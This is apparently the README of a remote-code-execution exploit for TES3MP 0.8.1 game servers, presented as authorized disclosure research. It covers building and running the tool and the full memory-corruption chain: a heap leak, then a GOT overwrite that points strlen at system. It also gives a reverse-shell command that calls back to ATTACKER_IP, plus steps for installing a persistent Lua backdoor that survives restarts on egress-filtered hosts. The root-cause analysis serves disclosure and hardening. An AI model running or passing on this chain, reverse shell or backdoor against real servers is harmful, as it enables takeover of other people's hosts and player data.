# tes3mp-rce

Remote code execution against **TES3MP 0.8.1** dedicated servers, demonstrated end-to-end against the
distributed release binary (`tes3mp-server.x86_64`). Runs one command on the server host as the account
the server runs under.

> **Authorized security research.** This targets the author's own infrastructure in an isolated lab, and
> exists for coordinated disclosure to TES3MP upstream and for hardening the author's own deployment.
> Do not point it at a server you do not own or lack written permission to test.

## What it needs, and what it does not

| Requirement | Needed? |
|---|---|
| Network reach to the game port | **yes** |
| The server's connection password (`password` in `tes3mp-server-default.cfg`) | **only if the server sets one** (`-P`) |
| A registered user account | **no** |
| A user account password | **no** |
| Any in-game rank, staff status, or privilege | **no** |
| A prior login of any kind | **no** |
| Any file from the target box | **no**: libc base is resolved over the wire; `system`'s per-build offset comes from a table of public distro packages (`--system-off`/`--libc` for a glibc not in it) |

The distinction matters and is easy to get wrong. TES3MP has **two independent secrets**:

1. **The server password**, one shared string, set by the admin in the server config, checked in C++ at
   `ID_SYSTEM_HANDSHAKE` (`apps/openmw-mp/Networking.cpp:118`). A wrong value gets the client kicked before
   `setHandshake()`, and every packet this exploit uses is gated on `isHandshaked()`. So on a passworded
   server you must pass it with `-P`. The upstream default config ships this **empty**.
2. **User accounts**, usernames and passwords managed entirely by CoreScripts (Lua). This exploit never
   registers, never logs in, and no account file is ever created. The C++ packet layer gates on the
   handshake and `POSTLOADED` only, and never consults the Lua-side account state.

So the accurate severity statement is:

* **Default-configured server (no `password` set): unauthenticated remote code execution.** No secret of
  any kind is required.
* **Passworded server: remote code execution for anyone who knows the server password**, i.e. every
  player who can connect at all, including players who have never created an account. A shared connection
  password is not an authorization boundary; it is the ticket to the front door that every player already has.

All four cases were measured rather than reasoned about (`evidence/server-password-matrix.txt`):

| Server | `-P` | Outcome |
|---|---|---|
| no password | (none) | command executed |
| passworded | omitted | kicked: `Wrong server password  used by client at ...` |
| passworded | wrong | kicked: `Wrong server password hunter2 used by client at ...` |
| passworded | correct | command executed, **`account files created: 0`** |

The RakNet-level connect token (`-t`) is **not** a secret: it is `TES3MP_VERSION + TES3MP_PROTO_VERSION +
commitHash`, identical for every stock client of a given build, and is a version-compatibility check.

## Build

```sh
make
```

That is the whole thing. On first run it clones **CrabNet** (TES3MP's RakNet fork) at the exact commit
TES3MP 0.8.1 links, builds only its static library, and then builds the exploit. Takes a few minutes once,
then seconds thereafter.

Requires `g++` (C++17), `cmake`, `make`, `git`, and **network access for the first build only**.

Builds on Linux (GCC 13+) and macOS (Apple clang). CrabNet is a 2020 codebase, so the Makefile force-includes `<cstdint> <cstdlib> <cstring>` (modern toolchains no longer pull them in transitively) and passes `-DCMAKE_POLICY_VERSION_MINIMUM=3.5` (CMake 4.x dropped the pre-3.5 compatibility that CrabNet's bundled PVS-Studio module still declares). Both are handled for you; they are called out only so the cause is obvious if you re-run the cmake step by hand.

### What it depends on, and why you do not have to go and get it

| Dependency | How it is handled |
|---|---|
| `NetworkMessages.hpp` (the packet-ID enum) | **vendored** in `third_party/tes3mp/`. It is the only file needed from TES3MP, so cloning a whole game engine for one enum would be silly. GPLv3, which is why this repo is GPLv3. |
| CrabNet (RakNet fork: transport, `BitStream`, Huffman string compression) | **fetched and built by `make`**, pinned to commit `19e66190`. BSD licensed. Not vendored because it has to be *linked*, and the artefact is a 17 MB platform-specific `.a`. |

The CrabNet pin is load-bearing: the wire format, reliability layer and string compressor must match what
the target server links, or the client never completes a handshake.

### Building offline, or against trees you already have

Nothing is fetched if you point at existing checkouts:

```sh
# an existing CrabNet checkout (built or not)
make CRABNET_SRC=/path/to/CrabNet

# a split headers/lib layout
make RAKNET_INC=/path/to/raknet/include/raknet \
     RAKNET_LIBDIR=/path/to/raknet/lib
```

Other targets: `make deps` (dependencies only), `make clean`, `make distclean` (also removes
`third_party/CrabNet`).

### Targeting a different TES3MP version

The connect token passed with `-t` is `TES3MP_VERSION + TES3MP_PROTO_VERSION + commitHash`, built from
`components/openmw-mp/Version.hpp` and the release commit. For 0.8.1 that is
`"0.8.1"` + `10` + `68954091c54d0596037c4fb54d2812313b7582a1`, i.e. the default. For another release,
re-read those three values, and re-pin CrabNet to whatever that release links
(`make CRABNET_COMMIT=<sha>`).

## Use

```sh
# server with no password (upstream default)
./tes3mp-rce 10.0.0.5

# server with a password
./tes3mp-rce -P 'correct horse battery staple' 10.0.0.5 25565

# choose the command
./tes3mp-rce -P '...' -c 'touch /tmp/proof' 10.0.0.5
```

```
-P, --server-password <pw>  server `password` setting. Not a user account.
-c, --command <cmd>         command to run (default: touch /tmp/tes3mp-rce-proof)
-t, --token <tok>           version token: TES3MP_VERSION+PROTO+commitHash (public, per build)
-b, --bind <ip>             local address for the second client (default 127.0.0.2)
-n, --name <base>           player name prefix (default: rce)
-C, --cell <name>           cell the two clients meet in (default: ExploitCell)
-v, --verbose               show relay parsing

modes
-p, --probe                 connect both clients to POSTLOADED, report reachability, and stop.
                            Touches no server memory: safe against a live server.
-s, --shell                 re-entry mode. Drives an ALREADY-INSTALLED backdoor as an ordinary
                            client; exploits nothing. Interactive, or one-shot with -c.
-A, --account-pass <pw>     account password for -s (default: rce-poc-pw-1)

target overrides (only if the target is not stock 0.8.1 on Ubuntu 24.04)
-B, --server-bin <path>     read vtable/strlen@got/malloc@got RVAs from a copy of the target's
                            tes3mp-server.x86_64
-L, --libc <path>           read malloc/system offsets from a copy of the target's libc.so.6
-M, --malloc-off <hex>      override malloc's offset in libc (default 0xad750)
-S, --system-off <hex>      override system's offset in libc (default 0x58750)
```

Two client connections are used: **A** performs the attack, **R** sits in the same cell and receives the
relayed packets that carry the leaked bytes. Both default to binding "any", so on one host they are just
two source ports from the same address; `-b` overrides the reader's bind only if you need a fixed one.

### Probe first (and mind the crash)

The full chain **crashes the target a few seconds after it succeeds**: `strlen` stays pointed at `system`,
so the next string operations inside the server run garbage. That is inherent to the technique, not a bug,
and it is independent of the payload: a marker `touch` crashes it just as a shell does. So do not point the
full run at a server you are not willing to see go down and restart.

`--probe` exists for exactly this. It connects both clients, completes the handshake (including the server
password), joins a cell, reports that it reached the point where the exploit would begin, and **stops
without touching server memory**. Run it first to confirm a target is reachable and your `-P` is right,
safely, against even a live server:

```sh
./tes3mp-rce -P 'server-password' --probe -v game.example.net
# [+] fingerprinted 154 required data files
# [+] both clients POSTLOADED in ExploitCell (no account, never logged in)
# [probe] reachable and handshake accepted. Both clients are in-cell.
```

If the probe reaches `POSTLOADED`, the full run (drop `-p`, set `-c`) will fire.

### Reachability notes

* **`ping` lies.** Many servers drop ICMP while the game's UDP port is open (it has to be, for players).
  A failed `ping` says nothing; the probe is the real reachability test.
* **Split-horizon DNS.** A hostname may resolve to an internal address on the LAN and a public one from
  outside. If the internal address is firewalled off but the public one hairpins, or vice versa, try both.
  Point the exploit at whichever address the probe actually reaches.
* **The game port is UDP.** SSH working (TCP/22) tells you nothing about whether UDP/25565 is reachable;
  they are usually governed by different firewall rules.

**Payloads should exit 0, and anything long-running must be backgrounded.** After the overwrite, `strlen`
returns the command's exit status, and that value is used as a string length elsewhere in the server, so a
failing or blocking command destabilises the process quickly. `touch /tmp/x` is fine as-is.

### Reverse shell

```sh
# on the attacking host
nc -lvnp 4444

# then
./tes3mp-rce -P 'server-password' \
  -c "/bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &" \
  victim.example.net
```

Three details, each of which is load-bearing:

* **The trailing `&` is mandatory.** `system()` blocks until the command finishes. Without it the server's
  packet loop stalls for as long as the shell is open, and the shell's eventual exit status is then used as
  a string length.
* **The inner `/bin/bash -c` wrapper is required.** `system()` runs the payload with `/bin/sh`, which on
  Debian/Ubuntu is `dash`, and dash supports neither `/dev/tcp/...` nor the `>&` redirection. The wrapper
  hands those bash-only features to bash.
* **Quote it as `-c "... '...' &"`**, double quotes outside and single quotes inside, so your own shell
  passes the whole thing through as one argument.

### Persistent shell against an egress-sealed target (`tools/rce.lua`)

A reverse shell needs the target to open a **new outbound** connection, which an egress-filtering DMZ
drops. When that is the case, ride the **inbound game flow** instead: the one channel that is open by
definition, because players connect on it.

The way to do that is not a socket-level trick, it is the server's own script loader. `system()` writes a
Lua module into the server's `scripts/custom/` and appends one `require` line to `customScripts.lua`.
The exploit crashes the server seconds later (see the crash note above), `systemd` restarts it, and the
restarted process loads the module as part of its normal startup. From then on the backdoor lives inside a
healthy server that owns the game socket, and it answers over RakNet using the server's own message API:
a chat command in, command output back as server messages.

```sh
# 1. install (this crashes the server; systemd's restart loads the module)
./tools/deploy-backdoor.sh -P '<server password>' -d /path/to/tes3mp/server/scripts <host>

# 2. drive it. This does NOT exploit anything; it is an ordinary client.
./tes3mp-rce --shell -P '<server password>' -n rce <host>
# [*] re-entry client -> <host>:25565 (account 'rce'). Hook must already be installed; nothing is exploited.
# prod$ id
# prod$ hostname

# or one-shot, for scripting
./tes3mp-rce --shell -P '<server password>' -n rce -c 'id' <host>
```

Two properties are worth being explicit about, because they are the difference between this and the
exploit chain:

* **`--shell` needs a user account, and the exploit chain does not.** CoreScripts gates chat on
  `IsLoggedIn()`, and command hooks dispatch from that callback, so the client registers on first use and
  leaves `data/player/<name>.json` on the target. That is persistent state the memory-corruption path never
  creates. It is also the loudest thing this tool does.
* **It survives restarts, and it is not memory-resident.** Re-entry touches no server memory, so it works
  after a reboot and can be used repeatedly without re-running the chain. The flip side is that it is on
  disk, in the server's own script tree, where a file listing or a config-management converge will find it.

**Uninstall:** delete `scripts/custom/rce.lua`, remove the `require("custom/rce")` line from
`customScripts.lua`, restart the server, and delete any `data/player/<name>.json` the shell created. The
module is loaded into the running process, so the restart is what actually removes it.

<details>
<summary>Superseded: the socket-reuse (findsock) stager</summary>

An earlier version delivered a detached Python stager that inherited the server's UDP `:25565` socket
(`fd 4`, not `CLOEXEC`) and answered a command protocol over that same socket, so replies matched the
established inbound 4-tuple and a stateful `pf` let them out. That is the classic socket-reuse / findsock
idea (skape; Metasploit `reuse` / `find_tag`) adapted to a shared UDP socket.

It is removed, because it does not survive a realistic target. The stager is a child of the server it was
injected into, so it lands in that unit's cgroup, and systemd's default `KillMode=control-group` SIGKILLs
the whole cgroup when the crashed unit is restarted. Port-squatting the game socket therefore loses the
race against the restart it depends on. The Lua route wins precisely because it stops fighting the restart
and uses it as the loader.

</details>

**Expect the server process to die shortly after the exploit fires**, backdoor or not. `strlen` remains
hijacked, so the next few string operations inside the server misbehave. That crash is load-bearing for the
install, since it is what triggers the restart that loads the module. This is also why the disclosure PoC
uses the marker payload instead: it proves execution without leaving the service in a broken state.

## How it works

Seven steps; see `docs/CHAIN.md` for the full detail and the measured constants.

1. **Heap pointer leak.** A truncated `ID_PLAYER_EQUIPMENT` for index 25 relays `chatMessage._M_p` back out.
   `RW()`'s failure return is discarded, so the server serializes the out-of-bounds field unmodified.
2. **Groom.** `ID_PLAYER_ANIM_PLAY` parks that pointer in `animation.mode|count`, which is where index 28's
   out-of-bounds string assignment will write, making the assignment survivable.
3. **Object base.** A truncated index 28 relays `creatureRefId._M_p`, which is a self-pointer (the string is
   permanently short, so it points at its own buffer). `base = leaked - 0x16F0`.
4. **Image base.** Arbitrary read of `*(base-8)` gives `vtable for Player + 16`; subtract its RVA. Asserted
   page-aligned, so a bad read is rejected instead of being used.
5. **libc base, resolved remotely, no files.** Read `&malloc` from the resolved `malloc@got` (not
   `strlen@got`: `strlen` is an **IFUNC**, so its GOT holds the selected implementation), then find libc's
   base by masking `&malloc` down to a load alignment and confirming the `\x7fELF` magic. The read is
   strlen-truncated so it cannot read a page-aligned *value* (a load base has a `0x00` low byte), but the
   magic byte `0x7f` is readable, so this works where a `link_map` walk would not. `system`'s offset within
   libc is per-build; it comes from a small table keyed on the remotely-computed malloc offset (filled from
   public distro packages), or `--system-off`/`--libc` for a build not in the table.
6. **Plant.** Aim `eq[7].refId` at `strlen@got`, with `capacity` set high enough that the assignment takes
   the in-place path rather than reallocating (which would `free()` the GOT address).
7. **Execute.** One equipment packet carrying two **in-bounds** items: item 7's `refId` assignment writes
   `system` into `strlen@got`, and item 5's assignment then calls the now-hijacked `strlen` **on the payload**,
   because `std::string::operator=(const char*)` calls `traits_type::length()` on its *source*. Both halves
   land inside a single deserialize, with no logging in between to trip over the corrupted `strlen`.

The arbitrary read (steps 4-5) works by planting a fake `std::string{_M_p = target, _M_len = 8}` in an
equipment `refId` and triggering a cell-change relay, which serializes 8 bytes read from `target` to the
other client.

## Root causes

1. **Unvalidated `equipmentIndex`** (`components/openmw-mp/Packets/Player/PacketPlayerEquipment.cpp:42`)
   gives an out-of-bounds read and write across the `Item[19]` array at 80-byte stride. Sibling packets
   already bounds-check (`Attribute >= 8`, `Skill >= 27`, `StatsDynamic >= 3`); this one does not.
2. **`RW()` return values are discarded**, so a deliberately truncated packet still performs assignments,
   turning "stream exhausted" into a write through a corrupted pointer.
3. **Partial RELRO**: `GNU_RELRO` ends exactly at `.got.plt` (RVA `0x2c3000`), which is `WA`, leaving
   301 `JUMP_SLOT` entries writable for the process lifetime.

Fixing (1) alone breaks the chain at step 1.

## Target profile

Constants in `Profile` (top of `src/tes3mp-rce.cc`) are measured against the distributed 0.8.1 Linux build
and Ubuntu 24.04's glibc 2.39. Against another build, re-measure:

```sh
readelf -rW tes3mp-server.x86_64 | grep -E ' (strlen|malloc)@'   # GOT slots
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -wE 'system|malloc' # libc offsets
# vtable RVA: attach gdb, `info symbol` the value the exploit reads at base-8
```

## Status

Demonstrated with a non-destructive marker payload, **5/5 cold starts** against a fresh server with fresh
ASLR each run (`evidence/rce-and-reverse-shell.txt`). Five is the whole sample: it is enough to show the
chain is not a fluke, not enough to put a number on the failure rate. Reliability was measured on an idle
lab server; a busy server with competing packet traffic is untested and would be expected to degrade,
since the grooming steps assume nothing else is churning the heap in between.
